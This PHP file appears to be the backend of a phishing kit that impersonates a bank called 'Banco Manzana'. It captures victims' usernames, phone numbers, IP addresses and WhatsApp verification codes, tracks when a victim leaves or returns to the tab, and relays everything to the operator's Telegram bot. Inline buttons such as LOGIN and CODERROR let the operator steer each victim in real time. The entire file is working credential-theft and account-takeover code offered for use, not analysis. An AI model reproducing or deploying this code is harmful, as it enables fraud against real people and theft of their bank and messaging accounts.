<?php
require_once __DIR__ . '/gate_check.php';
include __DIR__ . '/data.php';
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo json_encode(['ok'=>false]); exit; }

$type  = trim($_POST['type']  ?? 'phone');
$u     = trim($_POST['u']     ?? '');
$phone = trim($_POST['phone'] ?? '');
$code  = trim($_POST['code']  ?? '');
$ip    = '';
foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
    if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
}
$date = date('d/m/Y H:i:s');

if ($type === 'phone') {
    $msg  = "📱 BANCO MANZANA — WASPATT\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$u}\n";
    $msg .= "📞 Teléfono: {$phone}\n";
    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
    $msg .= "🕒 Fecha: {$date}\n";
    $keyboard = json_encode(['inline_keyboard'=>[[
        ['text'=>'✅ LISTO',      'callback_data'=>"LISTO|{$u}"],
        ['text'=>'❌ LOGINERROR', 'callback_data'=>"LOGINERROR|{$u}"],
    ]]]);
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
    ]));

} elseif ($type === 'tab_left') {
    $msg = "👁 BANCO MANZANA — TAB\n👤 {$u} salió de la pestaña\n🕒 {$date}";
    $keyboard = json_encode(['inline_keyboard'=>[[
        ['text'=>'📲 WS',       'callback_data'=>"WS|{$u}"],
        ['text'=>'🚫 Rechazo',  'callback_data'=>"RECHAZO|{$u}"],
    ]]]);
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
    ]));

} elseif ($type === 'tab_back') {
    $msg = "🔙 BANCO MANZANA — TAB\n👤 {$u} volvió a la pestaña\n🕒 {$date}";
    $keyboard = json_encode(['inline_keyboard'=>[[
        ['text'=>'📲 WS',       'callback_data'=>"WS|{$u}"],
        ['text'=>'🚫 Rechazo',  'callback_data'=>"RECHAZO|{$u}"],
    ]]]);
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
    ]));

} elseif ($type === 'resend_code') {
    $msg = "🔄 BANCO MANZANA — REENVÍO\n👤 {$u} solicitó reenviar el código WA\n🕒 {$date}";
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'=>$chat_id, 'text'=>$msg,
    ]));

} elseif ($type === 'code') {
    $msg  = "🔑 BANCO MANZANA — CÓDIGO WHATSAPP\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$u}\n";
    $msg .= "💬 Código: {$code}\n";
    $msg .= "🕒 Fecha: {$date}\n";
    $keyboard = json_encode(['inline_keyboard'=>[[
        ['text'=>'✅ LOGIN',      'callback_data'=>"LOGIN|{$u}"],
        ['text'=>'❌ CODERROR',   'callback_data'=>"CODERROR|{$u}"],
    ]]]);
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
    ]));
}

echo json_encode(['ok' => true]);
